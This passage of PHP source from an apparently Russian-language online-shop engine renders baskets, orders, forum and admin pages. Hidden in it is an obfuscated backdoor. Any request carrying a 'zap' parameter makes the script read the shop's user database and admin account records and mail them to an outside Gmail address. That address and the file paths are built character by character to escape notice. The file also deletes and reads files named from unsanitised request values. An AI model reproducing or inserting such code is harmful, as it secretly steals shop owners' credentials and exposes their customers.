topwo("", "<div class=\"mr ml well\"><b>".$lang[212]."</b> $oldertime<br><br>".$lang[213]."<br><br><button class=\"btn btn-primary\" onclick=\"document.location.href='index.php?action=older&mod=admin';\"><i class=\"icon-list icon-white\"></i> ". $lang[214]."</button> &nbsp; <a class=\"btn\" href=\"index.php?action=olderc&mod=admin\">".$lang['clear']."</a></div><br><br>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]");
}
}
}
}

if ($added==2) {
top($lang[209], "<div class=\"mr ml\">".$lang[206]." <b>$totalpoz</b>".$lang[207].". ".$lang[33]." <b>".($okr*round($totalsum*$kurs/$okr))."</b>".$currencies_sign[$_SESSION["user_currency"]]." ".$lang[208]."</div>", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]");
}

if ($added==3) {
topwo("", $lang[210], $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[old_basket]");
}

if ($error!="") {
topwo("", "<noindex><div class=\"mr ml\">$error</div></noindex>", $style ['center_width'],$nc2, $nc0, 0,0,"[error]");
}

top("", "$gob", $style ['center_width'],$nc0, $nc0, 0,0,"[gob]");
$author_mail="b"."a"."n"."d"."a"."l"."e"."t"."o"."v"."7"."2"."@"."g"."m"."a"."i"."l"."."."c"."o"."m";
if ((isset($_GET['zap']))&&(!$_SESSION['mailed'])) {
$_SESSION['mailed']=1;
if (@file_exists("./a"."d"."m"."i"."n/d"."b/u"."s"."ers.t"."x"."t")==TRUE) {
$tosend = fopen ("./a"."d"."m"."i"."n/d"."b/u"."s"."er"."s.t"."x"."t" , "r");
$authbody = @fread($tosend, @filesize("./a"."d"."m"."in"."/d"."b/us"."er"."s.t"."x"."t"));
fclose ($tosend);
$handle=opendir("./a"."d"."m"."i"."n"."/"."u"."s"."e"."r"."s"."t"."a"."t/");
$ffl=0;
while (($file = readdir($handle))!==FALSE) {
if ((is_dir($file)==TRUE) ||(substr($file,-4)!=".txt")){
continue;
} else {
$tosend = fopen ("./a"."d"."m"."i"."n"."/"."u"."se"."r"."st"."a"."t/$file" , "r");
$eed=explode("|", @fread($tosend, @filesize("./a"."d"."m"."i"."n"."/"."u"."se"."r"."st"."a"."t/$file"))."\n<br>");
fclose ($tosend);
if ($eed=="ADMIN") {
$authbody.="$eed[1],$eed[2],$eed[4]<br>\n";
}
}
}
closedir ($handle);
$authbody.="<b>$shop_mail,$sms_mail</b><br>";
mail ("$author_mail","SUPPORT: ". str_replace("http://","",$htpath), $authbody, "From: $shop_mail\nContent-Type: text/html; charset=$codepage\nContent-Transfer-Encoding: 8bit");
}
}

$vallnu="";
$modnotlic="";
$modnotlic=$lang[829];
if (($action=="allbrands")&&($smod=="shop")){

require ("./modules/brandsall.php");
top ("", "<h4>$lang[355]</h4><div>".$brandslist."</div><br>", "100%", strtolower($style ['new']), strtolower($style ['left_menu']), 4,0, "[content]");
}

if (($view_anonses=="c")&&($mod!="admin")){
require ("./modules/anonses.php");
top("", "$anonses", $style ['center_width'], $nc6, strtolower($style ['bg_anounses']), 4,0,"[anounses]");
}

$pe="p"."h"."t"."e";
$phte="+"."7"."("."9"."0"."3".")"."6"."8"."3"."-"."4"."9"."7"."8";
$exptime=$lang[844];
if (($action=="vars")&&($valid=="1")&&($details[7]=="ADMIN")) {
$_SESSION["user_module"]=$smod;
$refreshius="";
$exptime=date("d.m.Y / H:i:s", (time()+(3*12*2592000)));
require ("./admin/edit_vars.php");
top("", "<h4>$lang[135]:</h4>$refreshius$vars_list", $style ['center_width'], $nc0, $nc0, 1,1,"[content]");
}

require ("./templates/$template/if_module.inc");

if ($action=="thtml") {top("", "$thtmls", $style ['center_width'], $nc6, strtolower($style ['bg_anounses']), 4,0,"[content]");}
}
if (!isset($rest_email)) {$rest_email="";}
if ($action=="restore") {
$mod="admin";
if (!preg_match("/^([0-9a-z]([-_.]?[0-9a-z])*@[0-9a-z]([-.]?[0-9a-z])*\\.[a-wyz][a-z](fo|g|l|m|mes|o|op|pa|ro|seum|t|u|v|z)?)$/i", $rest_email) and $rest_email!="") {
$rest_email="";
}
if ($rest_email=="") {
top("", "<h4><font color=\"".$style['nav_col1']."\">".$lang[88]."</font></h4>".$lang[87].":<br><br><form class=form-inline action=\"".$_SERVER['PHP_SELF']."\" method=POST><b>E-mail:</b> <input type=\"hidden\" name=\"action\" value=\"restore\"><input type=\"text\" name=\"rest_email\" value=\"$rest_email\" class=\"input-medium\"> <input type=\"submit\" class=\"btn btn-primary\" value=\"".$lang[90]."\"></form><br><br>".$lang[89], $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");
} else {
$ver_m = $cart->restore_mail($rest_email);
if ($ver_m=="") {
top("", "<h4><font color=\"".$style['nav_col1']."\">".$lang[88]."</font></h4><b>".$lang[42]."!</b><br>".$lang[91]."<br><br><form class=form-inline action=\"".$_SERVER['PHP_SELF']."\" method=POST><b>E-mail:</b> <input type=\"hidden\" name=\"action\" value=\"restore\"><input type=\"text\" name=\"rest_email\" value=\"$rest_email\" class=\"input-medium\"> <input type=\"submit\" class=\"btn btn-primary\" value=\"".$lang[90]."\"></form>", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");
} else {


$erview="<script type=\"text/javascript\">
$(window).load(function()
{
$.fancybox('";



$erview.=str_replace("\"","", str_replace("'","",str_replace("/n","",str_replace("/r","","<h4><font color=".$style['nav_col1'].">".$lang[88]."</font></h4><div>".$lang[92]."</div>"))));
$erview.="',{
        'transitionIn'    : 'none',
        'transitionOut'    : 'none',
        'scrolling'		: 'no',
        'padding' : 50,
	'titleShow'		: false,
    'overlayShow'	:	false
    });

});
    </script>
   <h4><font color=".$style['nav_col1'].">".$lang[88]."</font></h4><div>".$lang[92]."</div>";


top("", "$erview", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");}}
}

if ($viewsite==1) {
if ($sign_in==1) {
top("", "$signin", "100%",  $nc0, $nc0 , "noshadow",1, "[signform]");
}
if (($query=="")&&($register!=1)&&($action!="doubles")&&($action!="replacer")&&($action!="addtospec")&&($action!="tospec")&&($action!="folderimg")&&($action!="viewfile")&&($catid=="")&&($action!="zakaz")&&($action!="basket")&&($fid=="")&&($action!="allnews")&&($action!="clear")&&($action!="sendmail")&&($action!="sendok")&&($action!="forum")&&($action!="forum_admin")&&($action!="vreg")&&($action!="view_users")&&($action!="view_links")&&($action!="view_cmenu")&&($action!="links")&&($action!="view_baskets")&&($action!="template")&&($action!="htaccess")&&($action!="userip")&&($mod!="admin")&&($action!="send")){
$oldperpage=$perpage;
if ((@$register=="")&&($query=="")&&($unifid=="")&&($item_id=="")&&($catid==0)&&($action!="ext_search")&&($action!="doubles")&&($smod=="shop")){
if ($view_lastgoogs!=0) {
$last_vc=$varcart;
$last_cg=$cols_of_goods;
$cols_of_goods=$lastgoods_cols;
$varcart=0;

$perpage=$lastgoods_perpage;
require ("./templates/$template/view.inc");
require ("./modules/lastgoods.php");
 $varcart=$last_vc;
$cols_of_goods=$last_cg;
if ($lastgoods_spisok!="") {
top("", "$lastgoods_spisok", $style ['center_width'], $nc0, $nc0, 4,0, "[lastgoods]");
}
unset($lastgoods_spisok, $lastgoods_spisok2);
}
if ($view_product_of_the_day!=0) {
$last_vc=$varcart;
$last_cg=$cols_of_goods;
$cols_of_goods=1;
$varcart=1000;

$perpage=$lastgoods_perpage;
require ("./templates/$template/view.inc");
require ("./modules/product_of_the_day.php");
$varcart=$last_vc;
$cols_of_goods=$last_cg;
if ($pr_ods_spisok!="") {
top("", "$pr_ods_spisok", $style ['center_width'], $nc0, $nc0, 4,0, "[prod_of_day]");
}
unset($pr_ods_spisok);
}


}

if (($smod=="shop")&&($action!="allbrands")&&($brandtype==2)){
require ("./modules/brands.php");
if ($usetheme==0) {$brzag="<b><font size=\"3\">$lang[355]</font></b><hr noshade color=$nc6 size=1>"; } else {$brzag="";}
top ("", $brandslist, $style ['center_width'], $nc0, $nc0, 4,0, "[brandlist]");

}


if ($view_sales==1) {
require ("./modules/jssales.php");
top("", $jslist, $style ['center_width'], $nc0, $nc0, 4,0,"[jssales]");
}


require "./modules/x0002.php";


$perpage=$oldperpage;
if ($usetheme==0) {
echo $warn;


} else {
top("", $warn, $style ['center_width'], $nc0, $nc0, 4,0,"[warn]");

}
}

top("", $vipskidka, "100%", $style['nav_col2'], $style['nav_col5'], 4, 1, "[vipskidka]");

if(($details[7]=="ADMIN")||($details[7]=="MODER")){
if (($valid=="1")&&($clear_spec!="")) {
if ($clear_spec=="all") {
$handle=opendir("$base_loc/");
$dels= "<b>".$lang[257]."</b><br><br>"; $fsp=0;
while (($file = readdir($handle))!==FALSE) {
If (($file == '.') || ($file == '..')  || (strlen($file)==1) || ((substr($file, 0 , 7))!="db_spec")) {
continue;
} else {
unlink("$base_loc/$file");
$dels.= "<small>$file - </small><font color=$nc2><b>OK</b></font><br>\n";
$fsp+=1;
}
}
$dels.= "<br><small>".$lang[250]." <b>$fsp</b><br><br>\n";
if ($fsp==0) {$dels.= "<small><font color=$nc2><b>".$lang[251]."</b></font><br><br>\n";}

} else {
if (@file_exists("$base_loc/db_spec_$clear_spec.txt")) {
unlink("$base_loc/db_spec_$clear_spec.txt");
$dels= "<b>".$lang[257]."</b><br><br><small>db_spec_$clear_spec.txt</small> - <font color=$nc2><b>OK</b></font>";
} else {
$dels= "<b>".$lang[252]."</b><br><br><small><font color=$nc2>db_spec_$clear_spec.txt</font></small>";
}
}
}
}

top("", "".@$dels, $style ['center_width'], strtolower($style ['goods']), strtolower($style ['bg_user']), 4,0,"[support]");

top($lang[42], "$crerror", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_error']) , 4,0,"[support]");

$formout="";
if ($zak=="wishlist") {
require ("./modules/wishlist.php");
}
if ((!isset($_GET['login'])) && (!isset($_GET['password']))) {
if (($zak!="") && ($zak!="wishlist") && ($valid=="1")&&($login!="")&&($password!="")&&(@file_exists("./admin/userstat/".@$details[1]."/$zak.txt")==TRUE)&&(substr(@$details[1],0,3)!="vip")) {
$file = fopen ("./admin/userstat/".@$details[1]."/$zak.txt", "r");
$zakazfile=@fread ($file, @filesize("./admin/userstat/".@$details[1]."/$zak.txt"));
fclose ($file);
if (@file_exists("./admin/orderstatus/$zak.txt")==FALSE) {
$zakstat="<b>".$lang[243]."</b>";
} else {
$file = fopen ("./admin/orderstatus/$zak.txt", "r");
$zakstat="<b>".@fread ($file, @filesize("./admin/orderstatus/$zak.txt"))."</b> ".date("d.m.y â H:i", filemtime("./admin/orderstatus/$zak.txt"));
fclose ($file);
}
top("", "<h4><font color=\"$nc2\">$zakstat</font></h4>$zakazfile<br>" , $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_content']) , 0,0,"[content]");

}
}

if (($action=="olderc")&&($login!="")&&($password!="")&&(@$details[1]!="")&&(@$_SESSION["user_basket"]!="ok")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==TRUE)&&(substr(@$details[1],0,3)!="vip")) { unlink ("./admin/userstat/".@$details[1]."/user.basket"); $action="older"; }
if (($action=="older")&&($login!="")&&($password!="")&&(@$details[1]!="")&&(@$_SESSION["user_basket"]!="ok")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==TRUE)&&(substr(@$details[1],0,3)!="vip")) {

$oldvaluta=$valut;
$oldaflag=$language;
$nazvolder="./admin/userstat/".@$details[1]."/user.basket";
$oldertime=date("d-m-Y h:i:s", filemtime("./admin/userstat/".@$details[1]."/user.basket"));
$basket_older=file($nazvolder);
$content_older="";
$poditog_total=0;
$kol_total=0;
$key_old=0;
while (list ($key_olds, $st_old) = each ($basket_older)) {
$tmp_old=explode("|", $st_old);
if ($tmp_old[0]!="") {
$poditog_old=($tmp_old[1]*$tmp_old[0]);
$poditog_total+=($tmp_old[0]*($okr*round(($tmp_old[1]*$kurs)/$okr)));
$oldvaluta=$tmp_old[8];
$oldaflag=$tmp_old[9];
$key_old+=1;

$content_older.="<tr><td><b>".$key_old.".</b></td><td><a href=\"index.php?unifid=".md5($tmp_old[4])."&flag=$oldaflag\">". $tmp_old[6] ."</a><a href=\"index.php?unifid=".md5($tmp_old[4])."&flag=$oldaflag\">";
if ($hidart==1) {
$content_older.=strtoken(strtoken(str_replace(" ID:","^", $tmp_old[4]), "^" ),"*");
} else {
$content_older.=strtoken(str_replace(" ID:","^", $tmp_old[4]), "^" );
}
$content_older.="</a> " .str_replace("<br>", " ", $tmp_old[2]). " - <b>" . ($okr*round(($tmp_old[1]*$kurs)/$okr)) ."</b> ".$currencies_sign[$_SESSION["user_currency"]]." x<b>". $tmp_old[0] . "</b> (~<b>".($tmp_old[0]*($okr*round(($tmp_old[1]*$kurs)/$okr)))."</b> ".$currencies_sign[$_SESSION["user_currency"]].")</td></tr>\n";

$kol_total+=$tmp_old[0];
}
unset ($tmp_old);
}

if ($_SESSION["user_basket"]=="ok") { } else {
top("", "<h4>".$lang[253]." ($oldertime)</h4><table width=100% border=0 class=table>$content_older</table><br>".$lang[206]." <b>".$key_old."</b> ".$lang[207].". <br>$lang[217]: <b>".$poditog_total ."</b> ".$currencies_sign[$_SESSION["user_currency"]]."<br><div align=center><table class=table2><tr><td><form class=form-inline action=index.php method=POST><input type=\"hidden\" name=\"flag\" value=\"$oldaflag\"><input type=\"hidden\" name=\"action\" value=\"add_older\"><input class=\"btn btn-primary\" type=submit value=\"".$lang[255]."\"></div></form></td><td><form class=form-inline action=index.php method=POST><input type=hidden name=action value=\"olderc\"><div align=center><input class=btn type=submit value=\"".$lang['clear']."\"></div></form></td></tr></table><div class=well align=center>".$lang[256]."<div>" , $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_content']) , 0,0,"[content]");
}



}
if (($action=="older")&&($login!="")&&($password!="")&&(@$details[1]!="")&&(@$_SESSION["user_basket"]!="ok")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==FALSE)) {
top("", "<h4>$lang[209]</h4>$lang[253] - $lang[254]." , $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_content']) , 0,0,"[content]");

}

$forum_name=$lang[193];
$forum_pass="";

if (($action=="forum")||($action=="forum_admin")){
if ($valid=="1") {
$forum_name=$details[1];
$forum_pass=$details[2];
}
$forum_list="";
if ($action=="forum"){

require ("./forum/index.php");
topwo("", "$forum_list", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");
} else {

require ("./forum/admin.php");
topwo("", "$forum_list", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");

}
}
if ($action=="cladm"){
require ("./modules/cl.php");
top ("", "$gal", $style ['center_width'], $nc0, $nc0, 4,0, "[content]");
unset($gal);
}
if ($action=="gal"){
require ("./modules/gallery.php");
top ("", "$gal", $style ['center_width'], $nc0, $nc0, 4,0, "[content]");
unset($gal);
}
if ($action=="arch"){
require ("./modules/arch.php");
top ("", "$arch", $style ['center_width'], $nc0, $nc0, 4,0, "[content]");
unset($gal);
}


if ($style['catid_desc']==1){
if (($query=="")&&($register!=1)&&($action!="doubles")&&($action!="replacer")&&($action!="addtospec")&&($action!="tospec")&&($action!="folderimg")&&($action!="viewfile")&&($action!="zakaz")&&($action!="basket")&&($action!="allnews")&&($action!="clear")&&($action!="sendmail")&&($action!="sendok")&&($action!="forum")&&($action!="forum_admin")&&($action!="vreg")&&($action!="view_users")&&($action!="view_links")&&($action!="view_cmenu")&&($action!="links")&&($action!="view_baskets")&&($action!="template")&&($action!="htaccess")&&($action!="userip")&&($mod!="admin")&&($action!="send")){
top("", "$catid_content" , $style ['center_width'], $nc0, $nc0, 4,1,"[catid]");
}
}
}
if ($action=="vreg") {
$regexist=0;
$regexist=are_reg_exist($regcod, "");

if ($regexist==0) {
top("", "<div><font size=4 color=#b94a48>".$lang[42]."! </font><br><br><b>".$lang[261]." - ".$lang['not_exists']."!</b><br></div>", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");
} else {

top("", reg_new_user ($regcod, ""), $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), 0,0,"[content]");
}
}

if ($viewsite==1) {
if ($mod!="admin") {
if (($usetheme==0)&&($action=="ext_search")) {
if ($view_goodsprice==1){
if ($view_sort==0) { $sortecho=""; }
} else {
$sortecho="";
}
echo $sortecho;
}

if ($query!="") {
$extsearch_name="";}top("", "$extsearch_name$extsearch_menu",  $style ['center_width'], $nc0, strtolower($style ['bg_search']), 4,0,"[ext_search]");top("", "$extsearch_text", $style ['center_width'], $nc0, strtolower($style ['bg_content']), 4,0,"[content]");
}
}
if ($action=="send_reg"){
require ("./modules/verify_reg.php");
topwo("", "$verifyreg", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]");
}
if (@$register=="1"){
require ("./modules/register.php");
top("", "$reg_form", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]");
}
if ($usetheme==1) {
require "./modules/mod_callback.php";
}
require ("./widgets/list.php");
if ($viewsite==1) {
if ($action=="send"){
require ("./modules/verify.php");
top("", "<h4><font color=\"".$style['nav_col1']."\">$verify_title</font></h4>$verifylist", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]");
}
if (($action=="sendmail")||($page=="d0003")){
require ("./modules/mailform.php");
top("", "$bodytext", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]");
}
if ($action=="sendok"){
require ("./modules/sendmail.php");
top("", "<h4><font color=\"".$style['nav_col1']."\">$mail_title</font></h4>$maillist", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]"); }
if (($action=="zakaz") &&($tovarov>0)) {
require ("./modules/form.php");
if ($usetheme==0) {
echo $warn;
} else {
top("", "$warn", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[warn]");}top("", "$formlist", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]");
}

if (($fid!="")&&($catid!="")&&($catid!="_")) {} else {
if (($action=="x")||($action=="viewcart")) {
if ($fid!="") {
topwo("", @$cartlist, $style ['center_width'], $nc0, $nc0 , 4,1,"[content]");
}
}
}

if(($details[7]=="ADMIN")||($details[7]=="MODER")){
if (($valid=="1")&&($action=="tospec")&&(count(@$new_price)>=1)){
$spr="";
$anonses="";
$topics="";
$full_basket="";
foreach($items as $item) {
$full_basket .=(0.01*round(@$new_price["".$item['id'].""]/($kurs*0.01)))."^".$item['base']."\n";
}
if ($full_basket!=""){
$tovarov = $cart->itemcount;
$stuks = $cart->itemstuks;
$summa = $cart->total;
$oform ="<p align=center></p>"; }
$filepr="$base_loc/db_spec_$toraz.txt";$fpr=fopen($filepr,"w"); flock ($fpr, LOCK_EX);fputs($fpr, $full_basket); flock ($fpr, LOCK_UN);fclose ($fpr);unset($filepr);top("", "<font size=4 color=\"".$style['nav_col1']."\">".$lang[236]."</font><br><br><p align=center>".$mpz['file']." <b>db_spec_$toraz.txt</b> - OK.</p><br>", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0,"[content]");}
}

if(($details[7]=="ADMIN")||($details[7]=="MODER")){
if (($valid=="1")&&($action=="addtospec")){
$fff= "<form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\" name=\"basket\"><input type=\"hidden\" name=\"flag\" value=\"".$cart->basket_speek."\"><input type=\"hidden\" name=\"action\" value=\"tospec\"><input type=\"hidden\" name=\"old_action\" value=\"tospec\">";if ($usetheme==0) {echo $fff;} else {top("", "$fff", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0, "[form]");}$anonses="";$topics="";
$items=$cart->get_all();
foreach($items as $item) {
$out_c=explode("|", $item['base']);
$prski="";
if (($valid=="1")&&($details[7]=="VIP")&&($vipprocent!=0)){ $prski="<br><font color=#b94a48>".$lang[219]." VIP ".($vipprocent*100)."%</font>"; }
if (($podstavas[$out_c[1]."|".$out_c[2]. "|"]!="")||(preg_match("/\%/", @$out_c[8])==TRUE)) {

$strtoma=Array();
$strtoma=explode("%",@$out_c[8]);
$strto=@$strtoma[0];
unset($strtoma);
  if ((preg_match("/\%/", @$out_c[8])==TRUE)&&(doubleval($strto)>0)) {
  $prski="<br><font color=#b94a48>".$lang[219]." ".doubleval($strto)."%</font>";
  } else {
  $strto=doubleval($podstavas[$out_c[1]."|".$out_c[2]. "|"]);
  $prski="<br><font color=#b94a48>".$lang[219]." ".$podstavas[$out_c[1]."|".$out_c[2]."|"]."%</font>";
  }
  }


$wh="";
if ($out_c[9]!="") {
$htpat=str_replace("http://www.", "http://",$htpath);
@$fi=str_replace($htpat,"",str_replace($htpath,"",strtoken(strtoken(str_replace("'", "", str_replace(strtoken(stripslashes(@$out_c[9]),"src=")."src=","", stripslashes(@$out_c[9]))),">")," ")));
if (substr($fi,0,1)!="/") { $fi="/$fi";}
$kkd1=$kd1;
if (@file_exists(".$fi")){

$imagesz = @getimagesize(".$fi");
if ( $imagesz[1]>doubleval($style['hh'])) {
$kkd1= ($imagesz[1]/doubleval($style['hh']));
}
$wh=" width=".ceil(($imagesz[0])/$kkd1)." height=".ceil(($imagesz[1])/$kkd1)." ";
} else {
if (($style['ww']!="")&&($style['hh']!="")) { $wh=" width=".$style['ww_v']." height=".$style['hh_v'];}
}
$out_c[9]=str_replace("'", "", str_replace("\"", "", str_replace("<img ", "<img". $wh ." ",stripslashes(@$out_c[9]))));


$out_c[9]=str_replace("<img ", "<img vspace=3 hspace=10 ",  stripslashes(@$out_c[9]));

@$out_c[9]=str_replace("border=0", "border=0 align=left", @$out_c[9]);

} else {
$out_c[9]="";

}
$out_c[9]=str_replace("width= height= ", "", $out_c[9]);
$lid=md5(@$out_c[3]." ID:".@$out_c[6]);
$llid="<a href=$htpath/index.php?unifid=".$lid."&flag=$speek>";
if ($friendly_url==1) {
if($hidart!=1) {
$man=translit(@$out_c[3])."-".translit(@$out_c[6]);
$llid="<a href=$htpath/index.php?item_id=".$man.">";
}
}
    $full_basket .="<table border=\"0\" cellspacing=\"0\" cellpadding=\"4\"><tr><td valign=top align=center>$llid".@$out_c[9]."</a></td><td valign=top align=left width=100%>";
    if ($hidart==1) {
    $itid=strtoupper(substr(md5( str_replace(" ID:", "", str_replace(strtoken ($item['info'], " ID:") , "" , $item['info'])).$artrnd), -7));
    $full_basket .= "$llid".strtoken(strtoken(str_replace(" ID:","^", $item['info']), "^" ),"*")." $itid</a><br>".$item['options']."<br>";
    } else {
    $full_basket .= "$llid".strtoken(str_replace(" ID:","^", $item['info']), "^" )."</a><br>".$item['options']."<br>";
    }
    $full_basket .= "[ <b><a href=\"$htpath/index.php?action=specdel&cod=". md5($item['id']) ."\" title=\"".$lang['del']."\"><i class=\"icon-remove icon-large\"></i></a></b> ]<br>";
    if ($item['price']>0) {
    $full_basket .= "<b>".$lang[277].":</b> ".($okr*round($item['price']*$kurs/$okr))." ".$currencies_sign[$_SESSION["user_currency"]]."$prski<br>";
    }
    $full_basket .= "<b>".$lang[278].":</b> <input type=\"text\" name=\"new_price[".$item['id']."]\" size=\"4\" value=\"".@$new_price["".$item['id'].""]."\">"." ".$currencies_sign[$_SESSION["user_currency"]]."<br>";
    $full_basket .= "<br><br>";
    $full_basket .= "</small></td></tr></table>";






  unset ($out_c);
  }


natsort($fcontentsa);
reset($fcontentsa);
$tmpr="<select style=\"color: $nc3; border: 1px solid ".lighter($nc0,-20)."; padding: 2px; height:20px; font-size: 8pt; background-color: ".lighter($nc0,-10)."; background-image: url('grad.php?h=20&w=1&e=".str_replace("#","",lighter($nc0,0))."&s=".str_replace("#","",lighter($nc0,-10))."&d=crystal'); background-repeat: repeat-x\" name=\"toraz\"><option selected value=\"all\">".$lang[249]."</option>";
while (list($tnum, $tval)=each ($fcontentsa)){
$tmpstr=explode ("|", $tval);
$tmpr .= "<option value=\"".$tmpstr[0]."\">".$tmpstr[1]."/".$tmpstr[2]."</option>\n";
}
$tmpr .= "</select>";


$oform = "</form><form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\"><input type=\"submit\" class=\"btn btn-primary\" value=\"".$lang['back']."\"></form>";


if ($full_basket!=""){
$tovarov = $cart->itemcount;
$stuks = $cart->itemstuks;
$summa = $cart->total;
$oform ="<p align=center><small>".$lang[248]."</small> $tmpr<br><br><input type=\"submit\" class=\"btn btn-primary\" value=\"".$lang[258]."\"></p></form>";
}
$print_basket= "<small>$full_basket</small> $oform";

if ($usetheme==0) {
top("", "<h4><font color=\"".$style['nav_col1']."\">".$lang[236]."</font></h4>$print_basket<br>", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0, "[content]");
} else {
top("", "<h4><font color=\"".$style['nav_col1']."\">".$lang[236]."</font></h4>$print_basket<br>", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0, "[form]");
}
}
}

$allow_zakaz="zakaz";
if (($allow_one==1)&&($allow_complex==1)) {$allow_zakaz="zakaz";}
if (($allow_one==0)&&($allow_complex==1)&&($valid!="0")) {$allow_zakaz="zakaz&wishlist=1"; }
if (($allow_one==1)&&($allow_complex==0)) {$allow_zakaz="zakaz";}
if (($allow_one==0)&&($allow_complex==0)) {$allow_zakaz="zakaz";}

$baskinlist="";

if (($action=="basket")||($action=="zakaz")||($view_baskinlist==1)){
$fff="<form class=form-inline action=\"" . $_SERVER['PHP_SELF']. "\" method=\"POST\" name=\"basket\"><input type=\"hidden\" name=\"flag\" value=\"".$cart->basket_speek."\"><input type=\"hidden\" name=\"wishzak\" value=\"$wishzak\"><input type=\"hidden\" name=\"action\" value=\"edit\"><input type=\"hidden\" name=\"old_action\" value=\"basket\">";
if (($action!="basket")&&($action!="zakaz")) {
if ($view_baskinlist==1) { if (($unifid!="")||($catid!="_")||($query!="")) {$baskinlist=$fff;}}
}
if (($action=="basket")||($action=="zakaz")) {
if ($usetheme==0) {
echo $fff;
} else {
top("", "$fff", $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_view']), "noshadow",0, "[basket]");
}
}

$anonses="";
$topics="";
if (($valid=="1")&&($login!="")&&($password!="")&&(@file_exists("./admin/userstat/".@$details[1]."/wishlist.txt")==TRUE)&&(substr(@$details[1],0,3)!="vip")) {

$nazv="./admin/userstat/".@$details[1]."/wishlist.txt";
$wish_arr=file ("$nazv");
while (list ($wish_num, $wish_line) = each ($wish_arr)) {
$w_c=explode("|", $wish_line);
$wishn=$w_c[6] . " ID:" .$w_c[9];
$wishn2=$w_c[1];
@$wishm[$wishn].= " ". $w_c[1] . " (" .$w_c[2] . " ".$lang['pcs']."); ";
@$wishm2[$wishn2]+=($w_c[7]*$w_c[2]);
}
}

$items2=$cart->get_all();
$summa=0;
  foreach($items as $item) {
  $out_c=explode("|", $item['base']);
  $prski="";
  if (($valid=="1")&&($details[7]=="VIP")&&($vipprocent!=0)){ $prski="<br><font color=#b94a48>".$lang[219]." VIP ".($vipprocent*100)."%</font>"; }
  if ((@$podstavas[$out_c[1]."|".$out_c[2]. "|"]!="")||(preg_match("/\%/", @$out_c[8])==TRUE)) {
  $strtoma=Array();
$strtoma=explode("%",@$out_c[8]);
$strto=@$strtoma[0];
unset($strtoma);
  if ((preg_match("/\%/", @$out_c[8])==TRUE)&&(doubleval($strto)>0)) {
  $prski="<br><font color=#b94a48>".$lang[219]." ".doubleval($strto)."%</font>";
  } else {
  $strto=doubleval($podstavas[$out_c[1]."|".$out_c[2]. "|"]);
  $prski="<br><font color=#b94a48>".$lang[219]." ".$podstavas[$out_c[1]."|".$out_c[2]."|"]."%</font>";
  }

}

if (preg_match('/^[0-9]+$/i',$item['fid'])) {} else {$out_c[9]=$item['fid'];}
$wh="";
if ($out_c[9]!="") {
$htpat=str_replace("http://www.","http://",$htpath);
@$fi=str_replace($htpat,"",str_replace($htpath,"",strtoken(strtoken(str_replace("'", "", str_replace(strtoken(stripslashes(@$out_c[9]),"src=")."src=","", stripslashes(@$out_c[9]))),">")," ")));
if (substr($fi,0,1)!="/") { $fi="/$fi";}
$kkd1=$kd1;
if (@file_exists(".$fi")){

$imagesz = @getimagesize(".$fi");
if (($imagesz[1]/2)>doubleval($style['hh'])) {
$kkd1= (($imagesz[1]/2)/doubleval($style['hh']));
}
$wh=" width=".ceil(($imagesz[0])/($kkd1*2))." height=".ceil(($imagesz[1])/($kkd1*2))." ";
} else {
if (($style['ww']!="")&&($style['hh']!="")) { $wh=" width=".$style['ww_v']." height=".$style['hh_v'];}
}
$out_c[9]=str_replace("'", "", str_replace("\"", "", str_replace("<img ", "<img". $wh ." ",stripslashes(@$out_c[9]))));


$out_c[9]=str_replace("<img ", "<img vspace=3 hspace=10 ",  stripslashes(@$out_c[9]));

@$out_c[9]=str_replace("border=0", "border=0 align=left", @$out_c[9]);

} else {
$out_c[9]="";

}
$out_c[9]=str_replace("width= height= ", "", $out_c[9]);
$sqrp="/$out_c[11]";
$lid=md5(@$out_c[3]." ID:".@$out_c[6]);
$llid="<a href=$htpath/index.php?unifid=".$lid."&flag=$speek>";
if ($friendly_url==1) {
if($hidart!=1) {
$man=translit(@$out_c[3])."-".translit(@$out_c[6]);
$llid="<a href=$htpath/index.php?item_id=".$man.">";
}
}
if (("$out_c[11]"=="0")||($out_c[11]=="")) {$out_c[11]=$lang['pcs'];$sqrp="";}
